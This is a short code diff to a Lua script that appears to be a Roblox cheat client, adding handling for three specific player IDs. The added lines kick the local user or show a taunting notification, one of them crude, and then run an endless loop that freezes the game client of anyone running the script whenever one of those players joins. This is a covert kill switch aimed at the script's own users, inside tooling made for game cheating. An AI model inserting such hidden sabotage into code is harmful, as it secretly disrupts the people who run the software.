@@ -1982,6 +1982,27 @@ runFunction(function()
 		end
 
 		local function newPlayer(plr)
+			if plr.UserId == 4720262362 then --USER ID FAKE GRANDAD
+				task.spawn(function() 
+					lplr:Kick("ur funny") --KICK MESSAGE
+				end)
+				task.wait(0.1)
+				while true do end
+			end
+			if plr.UserId == 1435828652 then --USER ID NICKNAMZ
+				task.spawn(function() 
+					warningNotification("wejpik", "czesc nicknamez seksiaku", 5)
+				end)
+				task.wait(0.1)
+				while true do end
+			end
+			if plr.UserId == 4710088386 then --USER ID MIKUSDEV
+				task.spawn(function() 
+					warningNotification("wejpik", "dzien dobry wlascicielu :p", 5)
+				end)
+				task.wait(0.1)
+				while true do end
+			end
 			if (WhitelistFunctions:CheckPlayerType(plr) ~= "DEFAULT" or WhitelistFunctions.WhitelistTable.chattags[WhitelistFunctions:Hash(plr.Name..plr.UserId)]) then
 				if lplr ~= plr and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then
 					GuiLibrary.SelfDestruct = function()
